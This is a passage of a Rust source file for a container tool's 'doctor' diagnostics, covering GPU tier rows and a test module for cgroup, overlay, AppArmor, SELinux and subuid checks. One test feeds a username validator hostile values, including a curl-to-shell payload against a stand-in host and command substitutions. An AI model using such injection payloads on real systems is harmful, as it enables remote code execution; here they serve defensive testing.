    let ver = std::fs::read_to_string("/proc/sys/kernel/osrelease")
        .map(|s| s.trim().to_string())
        .unwrap_or_else(|_| "unknown".into());
    R::ok(format!("kernel: {ver}"))
}

/// What a VRAM cap would be worth on each GPU present, per [`crate::gpu`].
///
/// kern does not slice GPUs today, and this row says so by describing the AUTHORITY a cap would
/// have rather than offering one. That ordering is the point: the honest description of the
/// boundary ships before the mechanism, so there is never a window in which kern can cap a GPU
/// while its own documentation is still catching up with what the cap is worth.
///
/// EVERY GPU ROW IS AN OK, AND IT USED TO BE A WARNING ON THE COOPERATIVE TIER. The warning was
/// arguing against a misreading - "a green tick means capping this GPU is safe" - that needs a cap
/// to exist in order to be made, and no flag in this binary caps a GPU: `kern box --help` has no
/// `--gpus` and no `--vram`. So the `!` fired on every host with any DRM node, which on an ARM board
/// is a display core (`v3d`, `vc4-drm`, `nv_platform`) and on WSL is a passthrough node. A warning
/// that is true of 100% of hosts teaches the reader to skim past `!`, and the rows that need to be
/// read - unprivileged userns restricted, no cgroup delegation - are in the same list.
///
/// What the row must still never do is imply a boundary; that contract moved from the severity to
/// the words, where the vocabulary gate can hold it. A host with no GPU at all is an OK too.
fn check_gpu() -> Vec<R> {
    let gpus = crate::gpu::detect();
    if gpus.is_empty() {
        return vec![R::ok(
            "no GPU found: GPU capability tiers do not apply on this host".into(),
        )];
    }
    gpus.iter().map(gpu_row).collect()
}

/// The row for ONE GPU, as a pure function of the detected facts.
///
/// Split out from [`check_gpu`] so the assembled text can be tested against every combination of
/// tier, `dmem` controller and `/dev/kfd` without owning the hardware. The claim vocabulary is
/// checked on THIS string, not on the tier's claim alone, because the appendices below are the part
/// most likely to drift.
fn gpu_row(g: &crate::gpu::Gpu) -> R {
    // The VERDICT is the card, its tier and the evidence. Everything a reader needs only when they
    // are about to hand the device to a tenant goes on the note line.
    //
    // `dmem` and `/dev/kfd` sit there as FACTS and never as promotions. The controller accounts
    // faithfully and, on the driver this was measured against, does not charge the ROCm compute path
    // to the allocating cgroup, so its presence alone changes nothing about what a cap is worth.
    // Naming them keeps the reader from concluding that kern failed to notice.
    let mut note = g.tier.short().to_string();
    if g.dmem_controller {
        note.push_str(" · dmem cgroup controller present");
    }
    if g.kfd_present {
        note.push_str(" · /dev/kfd present");
    }
    R::ok_note(&crate::gpu::describe(g), &note)
}

// ── helpers ──

fn read_int(path: &str) -> Option<i64> {
    std::fs::read_to_string(path).ok()?.trim().parse().ok()
}

/// Is `bin` on `PATH`? (No spawn - just a path probe.)
fn which(bin: &str) -> bool {
    crate::global_env("PATH")
        .map(|p| std::env::split_paths(&p).any(|d| d.join(bin).exists()))
        .unwrap_or(false)
}

#[cfg(test)]
mod tests {
    #[test]
    fn the_verdict_tally_inflects_and_omits_a_zero() {
        use super::tally;
        // This host: 17 green, one missing sshfs, no blocker. It is the only shape a run here can
        // produce, which is why the rest are asserted rather than eyeballed.
        assert_eq!(tally(17, 1, 0), "17 ok, 1 warning");
        // A clean host. `0 warnings` said nothing and was most of the line.
        assert_eq!(tally(18, 0, 0), "18 ok");
        assert_eq!(tally(15, 3, 0), "15 ok, 3 warnings");
        // Blockers lead, because they are what stops the reader from running a box at all.
        assert_eq!(tally(12, 0, 1), "1 blocker, 12 ok");
        assert_eq!(tally(11, 2, 3), "3 blockers, 11 ok, 2 warnings");
        // Nothing probed at all is not a sentence about warnings.
        assert_eq!(tally(0, 0, 0), "0 ok");
        for (o, w, f) in [(17, 1, 0), (18, 0, 0), (11, 2, 3), (0, 0, 0)] {
            assert!(
                !tally(o, w, f).contains("(s)"),
                "the verdict line inflects, it does not parenthesise"
            );
        }
    }

    /// EVERY NEGATIVE MEMORY-CAP ROW MUST NAME THE DIRECTORY IT PROBED.
    ///
    /// An outside independent test refused a release on this. doctor printed that a `--memory` write
    /// "silently never bites", and on the same host a `--memory 64m` box exited 137 through `exec`.
    /// The sentence named no cgroup and their box's PID 1 sat in `0::/`, so nothing in the output
    /// said whether the two statements were even about the same directory - and the verdict could
    /// not be checked against `/proc/<pid1>/cgroup`, the one file that settles it.
    ///
    /// THIS USED TO READ THE SOURCE, because the rows were built inline in `check_cgroup` and this
    /// host answers `Enforced`, so none of the negative arms could be rendered to look at. Now that
    /// [`no_user_manager_verdict`] is a pure function they can be, and the check moved to the text a
    /// reader actually sees: a source check passes on a `format!` that interpolates the phrase into
    /// a field nothing prints.
    ///
    /// The path may be on either line of the row. It is on the second one for the two arms that
    /// carried it in the verdict, where it cost 255 characters on one line.
    #[test]
    fn a_row_that_denies_a_memory_cap_names_the_cgroup_it_probed() {
        use kern_isolation::MemoryCapState;
        const SITES: &str = "probed a child of: /sys/fs/cgroup/user.slice/user-1000.slice";
        for st in [MemoryCapState::PresentNotDelegated, MemoryCapState::Absent] {
            let row = no_user_manager_verdict(st, SITES).text();
            assert!(
                row.contains(SITES),
                "a row saying a cap does not bind names no cgroup, so an independent test cannot \
                 check it against /proc/<pid1>/cgroup: {row}"
            );
        }
        // POSITIVE CONTROL: the assertion must be capable of failing. A verdict that is NOT a denial
        // has no reason to carry the phrase, and if every row did, the loop above proves nothing.
        let fine = no_user_manager_verdict(MemoryCapState::Enforced, SITES).text();
        assert!(
            !fine.contains(SITES),
            "the ENFORCED row carries the probed path too: {fine}"
        );

        // The third denial is still built inline, in the branch this host cannot reach either, so it
        // keeps the source check until that arm is a pure function as well.
        let src = include_str!("doctor.rs");
        let d = "does not bind in the box's cap target";
        let at = src
            .find(d)
            .unwrap_or_else(|| panic!("no memory-cap row says {d:?} any more - update this test"));
        // FORWARD, to the end of THIS `R::Warn(` call, not backward to the nearest `format!`. The
        // backward form broke the moment the phrase moved from the verdict into the hint, which is
        // exactly the edit that made this row fit a terminal: it then read the PREVIOUS row's
        // `format!` and reported a defect in a row that was correct.
        let start = src[..at]
            .rfind("R::Warn(")
            .expect("a denial row must be an R::Warn");
        let end = src[at..].find("\n        }").map_or(src.len(), |o| at + o);
        assert!(
            src[start..end].contains("memory_probe_sites_phrase()"),
            "the row saying {d:?} states a cap does not bind without naming the cgroup it probed"
        );
    }

    /// The phrase must name REAL, absolute cgroup paths - not an empty parenthesis.
    ///
    /// [`memory_probe_sites_phrase`] resolves its paths through
    /// `kern_isolation::memory_cap_probe_sites`, the same call the probe uses, so this also pins that
    /// the two cannot drift apart into naming a directory no cap is ever written to.
    #[test]
    fn the_probed_sites_are_named_as_absolute_cgroup_paths() {
        let phrase = super::memory_probe_sites_phrase();
        if phrase == "no cap target could be resolved" {
            return; // Honest on a host with no v2 cgroup at all; nothing to name.
        }
        assert!(phrase.starts_with("probed a child of: "), "got {phrase:?}");
        for p in phrase.trim_start_matches("probed a child of: ").split(", ") {
            assert!(
                p.starts_with("/sys/fs/cgroup"),
                "a named site must be a cgroupfs path, got {p:?}"
            );
        }
    }

    /// THE ROW MUST NOT SAY `available` FOR A MOUNT THAT WAS REFUSED.
    ///
    /// Every non-zero exit collapsed into one `None`, which `check_overlay` matched with `_ =>` and
    /// reported as `overlayfs: available`. A field report saw that tick and, minutes later,
    /// `[flat · unprivileged overlay unavailable]` from a build on the same host.
    #[test]
    fn a_refused_mount_is_never_reported_as_available() {
        assert!(
            matches!(exit_verdict(3), Some(OverlayProbe::Refused)),
            "a refused mount is the one answer the build acts on"
        );
        assert!(matches!(exit_verdict(1), Some(OverlayProbe::NoUserns)));
        // NOT A VERDICT. The child never reached the mount, so neither answer is a fact.
        assert!(matches!(exit_verdict(2), Some(OverlayProbe::Unknown)));
        assert!(matches!(exit_verdict(99), Some(OverlayProbe::Unknown)));
        // A clean exit defers to the timings the child wrote.
        assert!(exit_verdict(0).is_none());
    }

    /// THE CODES THIS MAPS ARE THE CODES THE CHILD WRITES.
    ///
    /// `exit_verdict` is keyed on numbers chosen a few dozen lines away, inside the forked child.
    /// Renumbering one there and not here would leave the mapping compiling, running, and silently
    /// wrong - a refused mount reported as `Unknown`, which is the shape of the defect this whole
    /// row exists to remove. The two ends are held together by reading the source.
    #[test]
    fn the_exit_codes_this_maps_are_the_ones_the_child_writes() {
        const SRC: &str = include_str!("doctor.rs");
        let start = SRC
            .find("fn overlay_probe() -> OverlayProbe {")
            .expect("the probe must exist");
        let end = SRC[start..]
            .find("\nfn ")
            .map(|i| start + i)
            .unwrap_or(SRC.len());
        let body = &SRC[start..end];

        let mut codes: Vec<i32> = Vec::new();
        let mut rest = body;
        while let Some(i) = rest.find("_exit(") {
            rest = &rest[i + "_exit(".len()..];
            let num: String = rest.chars().take_while(char::is_ascii_digit).collect();
            if let Ok(n) = num.parse::<i32>() {
                if !codes.contains(&n) {
                    codes.push(n);
                }
            }
        }
        assert!(
            codes.len() >= 4,
            "expected the child's four exit codes, found {codes:?} - the probe changed shape and \
             this check stopped reading it, which would leave it green by absence"
        );
        for c in [0, 1, 2, 3] {
            assert!(
                codes.contains(&c),
                "the child no longer exits {c}, so `exit_verdict` maps a code nobody writes: {codes:?}"
            );
        }
        // And every code the child DOES write must be one this mapping names, or a real failure
        // mode arrives as `Unknown` and the row says nothing useful about it.
        for c in codes {
            if c == 0 {
                continue;
            }
            assert!(
                !matches!(exit_verdict(c), Some(OverlayProbe::Unknown)) || c == 2,
                "the child exits {c} and `exit_verdict` has no name for it"
            );
        }
    }

    use super::*;
    use crate::gpu::{overclaims, Evidence, Gpu, Tier, Vendor};

    impl R {
        /// Everything this row will print, message and hint together. Tests assert on the whole of
        /// it: a claim moved from the message into the hint is still a claim on screen.
        fn text(&self) -> String {
            match self {
                R::Ok(m, h) | R::Warn(m, h) | R::Fail(m, h) => format!("{m} {h}"),
            }
        }
    }

    fn fake(tier: Tier, dmem: bool, kfd: bool) -> Gpu {
        Gpu {
            card: "card0".into(),
            vendor: Vendor::Amd,
            device_id: Some(0x73df),
            driver: Some("amdgpu".into()),
            tier,
            evidence: match tier {
                Tier::Hw => Evidence::SriovVirtualFunction,
                Tier::Soft => Evidence::NoPartitionFound,
            },
            dmem_controller: dmem,
            kfd_present: kfd,
        }
    }

    /// THE GATE. Every assembled `doctor` row for a non-hardware GPU, across every combination of
    /// the two facts that extend it, checked against the reserved vocabulary.
    #[test]
    fn no_cooperative_row_claims_a_boundary() {
        for dmem in [false, true] {
            for kfd in [false, true] {
                let row = gpu_row(&fake(Tier::Soft, dmem, kfd)).text();
                assert_eq!(
                    overclaims(&row),
                    None,
                    "a TIER-SOFT row claims a boundary (dmem={dmem}, kfd={kfd}): {row}"
                );
                // THE EXACT STRING, because `pentest-gpu-claims.sh` A4 pins it too and the two
                // must not drift apart. This assertion was weakened to "the whole device" once and
                // the shell suite caught what this one then let through: a cooperative row that
                // avoided the forbidden words and no longer said anything about the boundary reads
                // as a capability to anyone skimming.
                assert!(
                    row.contains("NOT a boundary against malicious code"),
                    "the disclaimer went missing: {row}"
                );
            }
        }
        let none = check_gpu();
        assert!(
            !none.is_empty(),
            "doctor must always say something about GPUs"
        );
    }

    /// NO GPU ROW IS A WARNING, and the row stays ONE LINE whatever the two extra facts say.
    ///
    /// Both halves are the defect this replaced. The `!` was true of every host with a screen, so it
    /// spent the reader's attention on a feature this binary does not have; and the text it carried
    /// was four lines in a list whose every other entry is one. The tier still has to be legible
    /// from the row, which is what separates this from simply deleting the row.
    #[test]
    fn no_gpu_row_warns_and_none_of_them_wraps() {
        for tier in [Tier::Soft, Tier::Hw] {
            for dmem in [false, true] {
                for kfd in [false, true] {
                    let r = gpu_row(&fake(tier, dmem, kfd));
                    let (msg, note) = match &r {
                        R::Ok(m, n) => (m.clone(), n.clone()),
                        other => panic!("a GPU row warns again: {}", other.text()),
                    };
                    assert!(msg.contains(tier.label()), "the tier is unreadable: {msg}");
                    // The verdict line carries the card and its tier; the qualification is on the
                    // note. Bounds are asserted on each PART, because the shape on screen is two
                    // lines and a single joined length would hide one of them growing.
                    assert!(
                        msg.len() <= ROW_MAX,
                        "{} chars of verdict: {msg}",
                        msg.len()
                    );
                    assert!(
                        note.len() <= NOTE_MAX,
                        "{} chars of note: {note}",
                        note.len()
                    );
                }
            }
        }
    }

    /// EVERY VERDICT IN THIS FILE, INCLUDING THE ONES NO TEST CAN BUILD.
    ///
    /// The runtime gate below drives each PURE verdict over its whole input space, which is the right
    /// check and still not enough: `check_scope_toll` and `check_linger` decide inside their own
    /// probe, so their rows exist only on a host that is not this one and not the CI runner either.
    /// Three CI rounds were spent finding them one per push - 154, then another, then another -
    /// which is what a moving target looks like when the test can only see where it is standing.
    ///
    /// So this one does not run the code: it READS it. Every `R::ok`, `R::ok_note`, `R::Warn` and
    /// `R::Fail` in the production half of this file, with its first argument resolved through string
    /// continuations, a `format!` template, or a `const … : &str`. It found all six that were left in
    /// one pass, the longest 448 characters.
    ///
    /// Only the LITERAL part is measured, so an interpolated `{path}` is not counted: what a host
    /// substitutes is not something this file can bound. That is a floor, not a ceiling, and it is
    /// the half that prose regressions live in.
    #[test]
    fn no_verdict_in_this_file_is_a_paragraph() {
        /// Reads a Rust string literal starting at `bytes[i] == b'"'`, joining `\` continuations.
        fn literal(b: &[u8], mut i: usize) -> String {
            let mut out = String::new();
            i += 1;
            while i < b.len() {
                match b[i] {
                    b'\\' if i + 1 < b.len() => {
                        if b[i + 1] == b'\n' {
                            i += 2;
                            while i < b.len() && (b[i] == b' ' || b[i] == b'\t') {
                                i += 1;
                            }
                        } else {
                            out.push(b[i + 1] as char);
                            i += 2;
                        }
                    }
                    b'"' => return out,
                    c => {
                        out.push(c as char);
                        i += 1;
                    }
                }
            }
            out
        }

        let src = include_str!("doctor.rs");
        let src = &src[..src
            .find("#[cfg(test)]")
            .expect("the test module must exist")];

        let b = src.as_bytes();
        let mut checked = 0usize;
        for ctor in ["R::ok_note(", "R::ok(", "R::Warn(", "R::Fail("] {
            let mut from = 0usize;
            while let Some(rel) = src[from..].find(ctor) {
                let at = from + rel + ctor.len();
                from = at;
                let mut j = at;
                while j < b.len() && (b[j] as char).is_whitespace() {
                    j += 1;
                }
                let lit = if b[j] == b'"' {
                    literal(b, j)
                } else if src[j..].starts_with("format!") {
                    match src[j..].find('"') {
                        Some(o) => literal(b, j + o),
                        None => continue,
                    }
                } else {
                    // A `const NAME: &str`, which is how the longest row in this file was spelled.
                    let name: String = src[j..]
                        .chars()
                        .take_while(|c| c.is_ascii_uppercase() || *c == '_')
                        .collect();
                    if name.len() < 3 {
                        continue;
                    }
                    let decl = format!("{name}: &str = ");
                    match src
                        .find(&decl)
                        .and_then(|d| src[d..].find('"').map(|o| d + o))
                    {
                        Some(k) => literal(b, k),
                        None => continue,
                    }
                };
                checked += 1;
                assert!(
                    lit.len() <= ROW_MAX,
                    "{} chars of verdict, move the tail to the note or the hint: {lit}",
                    lit.len()
                );
            }
        }
        // Negative control: if the scan stops finding verdicts it passes on everything.
        assert!(
            checked > 30,
            "only {checked} verdicts found: the scan broke"
        );
    }

    /// Longest a row's two parts may be. Not a style preference: at 80 columns the verdict line is
    /// indented 4 and the note 6, so these are the widths that survive one wrap instead of three.
    const ROW_MAX: usize = 100;
    const NOTE_MAX: usize = 140;

    /// THE GATE OVER THE WHOLE LIST, which is the only place this defect is visible.
    ///
    /// Each row was written and read alone, and alone each one looked reasonable; read together on a
    /// terminal, two of them ran to 169 and 181 characters and wrapped over their neighbours. This
    /// holds every row at once, so a new one cannot be added past it, and it is also the check that
    /// the `Ok` note gets used rather than a qualification going back into a parenthesis.
    ///
    /// ONLY THE VERDICT LINE IS BOUNDED FOR A WARNING OR A FAILURE, and the first version of this
    /// bounded their hints too. That is wrong, and CI said so: the `Userns::NoMap` hint is 1078
    /// characters because it is a REMEDY, a sequence of commands with this binary's absolute path
    /// substituted into it three times, meant to be pasted rather than read. Length is a defect in
    /// a sentence a reader must read and a property of a command they must copy. An `Ok` note is a
    /// qualification and stays bounded.
    ///
    /// The rows of THIS host are not enough, which is the second thing CI said. The AppArmor remedy
    /// is unreachable on a machine where AppArmor does not restrict the rootless map, so the verdicts
    /// this host cannot produce are constructed and held to the same rule.
    #[test]
    fn every_doctor_row_fits_a_terminal() {
        // `check_tools` reads the process-global `PATH`, so this takes the lock for the whole body.
        let _g = crate::env_guard();
        let mut all = rows();
        assert!(all.len() > 5, "the list did not assemble: {}", all.len());
        // EVERY state each pure verdict can be in, not the one this host happens to be in. Driven
        // exhaustively rather than sampled: the first two versions of this test each found exactly
        // one more row per CI run, because each added only the state that had just failed.
        for probe in [Userns::Works, Userns::NoNamespace, Userns::NoMap] {
            all.push(userns_verdict(probe));
            for sysctl in [None, Some(0), Some(1), Some(2)] {
                all.push(apparmor_userns_verdict(sysctl, probe));
            }
        }
        for present in [false, true] {
            for mode in [None, Some("0"), Some("1"), Some("7"), Some("")] {
                all.push(selinux_verdict(present, mode.map(str::to_string)));
            }
        }
        // The five states of a host with no systemd user manager, with the runner's own cgroup path
        // as the probed site: that string is interpolated into the row, and the GitHub runner's is
        // four times longer than a desktop's, which is how two of these reached 255 characters.
        for st in [
            kern_isolation::MemoryCapState::Enforced,
            kern_isolation::MemoryCapState::EnforcedOnScope,
            kern_isolation::MemoryCapState::PresentNotDelegated,
            kern_isolation::MemoryCapState::Absent,
            kern_isolation::MemoryCapState::Unknown,
        ] {
            all.push(no_user_manager_verdict(
                st,
                "probed a child of: /sys/fs/cgroup/system.slice/hosted-compute-agent.service",
            ));
        }
        // Both branches of a tool row, for every tool as it is actually spelled in `check_tools`.
        // `which` decides which branch a real call takes, so a host with the tool never renders the
        // other one. The names are deliberately absent ones so the not-found branch is the one built.
        all.push(tool_req(
            "definitely-not-here",
            "kern pull / --image",
            "install GNU tar >= 1.27",
        ));
        all.push(tool_opt(
            "definitely-not-here",
            "pod outbound networking (NAT + DNS)",
            "a plain box is loopback-only whatever pasta does; `--net` gives it the host's stack",
            "install passt",
        ));
        for r in &all {
            let (msg, note, bound_note) = match r {
                R::Ok(m, n) => (m, n, true),
                R::Warn(m, h) | R::Fail(m, h) => (m, h, false),
            };
            assert_eq!(msg.lines().count(), 1, "a verdict spans lines: {msg}");
            assert!(
                msg.len() <= ROW_MAX,
                "{} chars of verdict, move the tail to the note line: {msg}",
                msg.len()
            );
            if bound_note {
                assert!(
                    note.len() <= NOTE_MAX,
                    "{} chars qualifying a PASSING row: {note}",
                    note.len()
                );
            }
        }
    }

    /// Neither one-line form may claim a boundary either. The gate that guards [`Tier::claim`] runs
    /// over the string `doctor` actually prints, which is now a different one.
    #[test]
    fn the_short_forms_never_overclaim() {
        for tier in [Tier::Soft, Tier::Hw] {
            assert_eq!(
                overclaims(tier.short()),
                None,
                "short form claims a boundary: {}",
                tier.short()
            );
        }
    }

    /// The `dmem` and `/dev/kfd` facts appear only when true, and neither changes the tier. This is
    /// the exact confusion the row exists to prevent: `dmem` present does not mean `dmem` enforces.
    #[test]
    fn dmem_and_kfd_are_reported_as_facts_not_promotions() {
        let bare = gpu_row(&fake(Tier::Soft, false, false)).text();
        assert!(!bare.contains("dmem cgroup controller present"));
        assert!(!bare.contains("/dev/kfd present"));

        let both = gpu_row(&fake(Tier::Soft, true, true)).text();
        assert!(both.contains("dmem cgroup controller present"));
        assert!(both.contains("/dev/kfd present"));
        assert!(
            both.contains("TIER-SOFT"),
            "dmem must not promote the tier: {both}"
        );
    }

    /// $USER reaches a `sudo` command line kern invites the reader to paste, so it is an allowlist
    /// and the fallback is the numeric uid. The shell payload and the ANSI escape below are the two
    /// shapes actually reproduced against the shipped binary before this was fixed.
    #[test]
    fn a_username_that_could_be_pasted_into_sudo_is_refused() {
        for good in ["alex", "root", "user_1", "svc.account", "build-agent", "a"] {
            assert!(is_pasteable_username(good), "refused a real name: {good}");
        }
        for bad in [
            "",                                     // unset
            "x; curl http://evil.example/p | sh #", // the reproduced payload
            "alex\u{1b}[31m",                       // ANSI, repaints the rest of the report
            "alex\nroot",                           // a second line in /etc/subuid
            "a b",                                  // splits the command
            "$(id -un)",                            // substituted by the reader's shell
            "`whoami`",
            "-rf", // read as an option
            "a/../../etc/passwd",
            "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", // 35 chars, over the cap
        ] {
            assert!(
                !is_pasteable_username(bad),
                "accepted a hostile name: {bad:?}"
            );
        }
    }

    /// `doctor` runs on hosts with no GPU at all, which is the majority case, and that must be an OK
    /// rather than a warning: nothing is degraded, the feature does not apply.
    #[test]
    fn a_host_with_no_gpu_is_not_a_warning() {
        for r in check_gpu() {
            let t = r.text();
            if t.starts_with("no GPU found") {
                assert!(matches!(r, R::Ok(..)), "no GPU is not a degraded state");
            }
        }
    }

    /// THE FIELD CASE: an allocation that exists must be FOUND when `$USER` is not set.
    ///
    /// Reported against `dev`: helpers installed, `/etc/subuid` holding `root:100000:65536`, running
    /// as uid 0 with an empty `USER`, and `doctor` warned that the map was missing. The old lookup
    /// interpolated `$USER` into the pattern, so an empty variable searched for lines starting with
    /// `":"` and matched nothing. The identity now comes from the kernel and `/etc/passwd`, which no
    /// caller gets to choose.
    #[test]
    fn an_allocation_under_the_login_name_is_found_without_consulting_the_environment() {
        let passwd = "root:x:0:0:root:/root:/bin/bash\nubuntu:x:1000:1000::/home/ubuntu:/bin/sh\n";
        let subuid = "ubuntu:100000:65536\nroot:165536:65536\n";

        let ids = subid_identities(0, passwd);
        assert_eq!(ids, vec!["root".to_string(), "0".to_string()]);
        assert!(
            has_subid_allocation(subuid, &ids),
            "uid 0 is allocated as `root`, and that is the spelling shadow-utils writes"
        );

        let ids = subid_identities(1000, passwd);
        assert!(has_subid_allocation(subuid, &ids));
    }

    /// The numeric spelling is equally valid, and it is the only one available to a uid that has no
    /// account: a container, or a host where the entry was never created.
    #[test]
    fn the_numeric_uid_is_accepted_and_is_the_fallback_when_no_account_exists() {
        assert_eq!(subid_identities(1234, ""), vec!["1234".to_string()]);
        assert!(has_subid_allocation(
            "1234:100000:65536\n",
            &subid_identities(1234, "")
        ));

        // A passwd that names OTHER uids must not lend its names to ours.
        let passwd = "root:x:0:0::/root:/bin/sh\n";
        assert_eq!(subid_identities(1234, passwd), vec!["1234".to_string()]);
        assert!(
            !has_subid_allocation("root:100000:65536\n", &subid_identities(1234, passwd)),
            "root's allocation is not uid 1234's allocation"
        );
    }

    /// The control that keeps the check honest in the other direction: a machine with no allocation
    /// must still WARN. A lookup that matched too eagerly would silence the warning that sends an
    /// operator to fix their map, which is the whole reason the check exists.
    #[test]
    fn a_missing_allocation_is_still_missing_and_a_prefix_is_not_a_match() {
        let passwd = "kern:x:1000:1000::/home/kern:/bin/sh\n";
        let ids = subid_identities(1000, passwd);

        assert!(
            !has_subid_allocation("", &ids),
            "an empty file allocates nothing"
        );
        assert!(
            !has_subid_allocation("someoneelse:100000:65536\n", &ids),
            "another account's line is not ours"
        );
        assert!(
            !has_subid_allocation("kernel:100000:65536\n", &ids),
            "`kern` must not be satisfied by `kernel`: the owner ends at the first colon"
        );
        assert!(
            has_subid_allocation("kern:100000:65536\n", &ids),
            "positive control: the exact name does match, so the three refusals above mean something"
        );
    }

    /// A malformed `/etc/passwd` may not make the check throw away the numeric identity it always
    /// has. A line with a non-numeric uid field is skipped, not fatal.
    #[test]
    fn a_broken_passwd_line_does_not_cost_us_the_numeric_identity() {
        let passwd = "brokenline\nnouid:x:notanumber:0::/:/bin/sh\nme:x:7:7::/:/bin/sh\n";
        assert_eq!(
            subid_identities(7, passwd),
            vec!["me".to_string(), "7".to_string()]
        );
        assert_eq!(subid_identities(99, passwd), vec!["99".to_string()]);
    }

    /// All five SELinux states, including the two that need a host this project does not have.
    ///
    /// They were first exercised by building a Fedora box per state and bind-mounting a synthetic
    /// `selinuxfs` over `/sys/fs/selinux`, which found a real defect (a readable `enforce` holding a
    /// non-number was reported as unreadable) and which no CI run will ever repeat. A pure verdict
    /// makes the same five checkable in a millisecond.
    ///
    /// ENFORCING MUST NOT WARN. It is the correct posture on every distro that ships SELinux, and a
    /// standing warning on a correct host teaches the reader to skim past `doctor`, which costs more
    /// than the line buys. The state is reported, and the actionable hint lives at the failure.
    #[test]
    fn doctor_does_not_say_ready_on_a_host_where_no_box_can_start() {
        let msg = |r: &R| match r {
            R::Ok(m, _) | R::Warn(m, _) | R::Fail(m, _) => m.clone(),
        };

        // THE UBUNTU 24.04 DEFAULT, and the reason this exists. `unshare(CLONE_NEWUSER)` succeeds
        // there and the uid map is refused, so a probe that stopped at `unshare` reported
        // "enabled" and the summary closed with "ready ... `kern box` will run here" while the
        // command it suggested failed. Measured on a stock cloud image, not constructed.
        let no_map = userns_verdict(Userns::NoMap);
        assert!(
            matches!(no_map, R::Fail(..)),
            "a host that cannot map must not pass: {}",
            msg(&no_map)
        );
        assert!(msg(&no_map).contains("REFUSED"), "{}", msg(&no_map));
        // It must not read as the namespace being unavailable, which is a different host and a
        // different fix.
        assert!(!msg(&no_map).contains("DISABLED"), "{}", msg(&no_map));
        // THE PROFILE IS OFFERED BEFORE THE SYSCTL. Turning the sysctl off lifts the restriction
        // for every program on the machine and does not survive a reboot; the profile is scoped to
        // this binary and persists. A hint that leads with the global switch teaches the wrong fix
        // to everyone who reads only the first command.
        let hint = match &no_map {
            R::Warn(_, h) | R::Fail(_, h) => h.clone(),
            R::Ok(..) => String::new(),
        };
        // `usize::MAX` for an absent remedy, so a hint that names only one of them fails the
        // ordering assertion rather than needing a second one to catch it.
        let prof = hint.find("apparmor_parser").unwrap_or(usize::MAX);
        let sysctl = hint.find("sysctl -w").unwrap_or(usize::MAX);
        assert!(
            prof < sysctl && sysctl != usize::MAX,
            "the hint must name the profile FIRST and the sysctl after it: {hint}"
        );
        assert!(
            hint.contains("every program on the machine"),
            "the sysctl's cost must be stated where it is offered: {hint}"
        );
        // IT NAMES THE PATH THIS BINARY RUNS FROM. AppArmor attaches by path, so a kern installed
        // outside the profile's attachment loads it and changes nothing: a silent no-op. The path
        // is what lets a reader see that is what happened.
        let running = std::env::current_exe()
            .map(|p| p.display().to_string())
            .unwrap_or_default();
        assert!(
            !running.is_empty() && hint.contains(&running),
            "the hint must name the running binary's path: {hint}"
        );
        // AND IT SAYS TO RE-RUN THE CHECK. AppArmor attaches at execve, so this process can never
        // observe a profile loaded after it started. Measured on Ubuntu 24.04: a fresh doctor
        // reports enabled while one started beforehand still reports the blocker.
        assert!(
            hint.contains("doctor"),
            "the hint must tell the reader to re-run the check: {hint}"
        );
        // THE COMMAND MUST BE RUNNABLE BY THE READER. The repo-relative
        // `packaging/apparmor/kern` only exists in a checkout: a release tarball carries the
        // binary alone and `cargo install` copies one file, so that path fails with "No such
        // file" for most of the people who will ever see this message. The binary emits the
        // profile instead.
        assert!(
            hint.contains("--apparmor-profile"),
            "the install line must not depend on a repo checkout: {hint}"
        );
        assert!(
            !hint.contains("packaging/apparmor"),
            "the hint must not name a path that a tarball install does not have: {hint}"
        );
        // AND THE RE-RUN APPLIES TO THE SYSCTL BRANCH TOO. Both remedies take effect for new
        // processes only, so a reader who takes the fallback needs the same instruction; it used
        // to be attached to the profile branch alone.
        let after_sysctl = hint.split("sysctl -w").nth(1).unwrap_or_default();
        assert!(
            after_sysctl.contains("doctor"),
            "the sysctl fallback must also tell the reader to re-run: {hint}"
        );

        // The other two are unchanged and still distinct.
        assert!(matches!(userns_verdict(Userns::Works), R::Ok(..)));
        let none = userns_verdict(Userns::NoNamespace);
        assert!(matches!(none, R::Fail(..)));
        assert!(msg(&none).contains("DISABLED"));
        assert_ne!(msg(&no_map), msg(&none), "two hosts, two sentences");

        // THE KNOB IS NOT THE VERDICT. On, and boxes work anyway (a profile covers the binary):
        // that is a fact to state, not a warning to raise.
        let on_but_fine = apparmor_userns_verdict(Some(1), Userns::Works);
        assert!(
            matches!(on_but_fine, R::Ok(..)),
            "a restriction that is not biting must not warn: {}",
            msg(&on_but_fine)
        );
        // On, and it is what refused: warn, but do not count the same broken host twice by
        // failing here as well as in `userns_verdict`.
        let on_and_biting = apparmor_userns_verdict(Some(1), Userns::NoMap);
        assert!(matches!(on_and_biting, R::Warn(..)));
        assert!(msg(&on_and_biting).contains("refused the map above"));
        // Off: nothing to say.
        assert!(matches!(
            apparmor_userns_verdict(Some(0), Userns::Works),
            R::Ok(..)
        ));
        assert!(matches!(
            apparmor_userns_verdict(None, Userns::Works),
            R::Ok(..)
        ));
    }

    #[test]
    fn the_userns_probe_agrees_with_this_host() {
        // A positive control against the machine running the suite: whatever the probe says, a box
        // either starts here or it does not, and CI runs on a host where it does. This is the one
        // assertion that would have caught the Ubuntu case before it shipped, because it exercises
        // the real syscall sequence rather than a fixture.
        let p = probe_userns();
        assert!(
            matches!(p, Userns::Works | Userns::NoMap | Userns::NoNamespace),
            "the probe must return one of its three states"
        );
        // Idempotent: it forks a child each time and must not leave the parent changed.
        assert_eq!(p, probe_userns(), "the probe changed its own answer");
    }

    #[test]
    fn selinux_verdict_separates_all_five_states() {
        let msg = |r: &R| match r {
            R::Ok(m, _) | R::Warn(m, _) | R::Fail(m, _) => m.clone(),
        };

        // No selinuxfs: the mode is not merely unknown, SELinux is not in force at all.
        let none = selinux_verdict(false, None);
        assert!(matches!(none, R::Ok(..)), "absent SELinux must not warn");
        // It must report what it OBSERVED (no selinuxfs here), not a claim about the host it
        // cannot see: a container that does not mount selinuxfs looks identical to a host with no
        // SELinux at all, and "not active on this host" told the reader the second one either way.
        assert!(msg(&none).contains("visible from here"), "{}", msg(&none));
        assert!(
            !msg(&none).contains("not active on this host"),
            "the probe cannot establish that: {}",
            msg(&none)
        );

        // Present and enforcing. Trailing newline, as the kernel writes it.
        let enf = selinux_verdict(true, Some("1\n".into()));
        assert!(
            matches!(enf, R::Ok(..)),
            "enforcing is the correct posture and must not warn"
        );
        assert!(msg(&enf).contains("ENFORCING"));

        // Present and permissive.
        let perm = selinux_verdict(true, Some("0\n".into()));
        assert!(matches!(perm, R::Ok(..)));
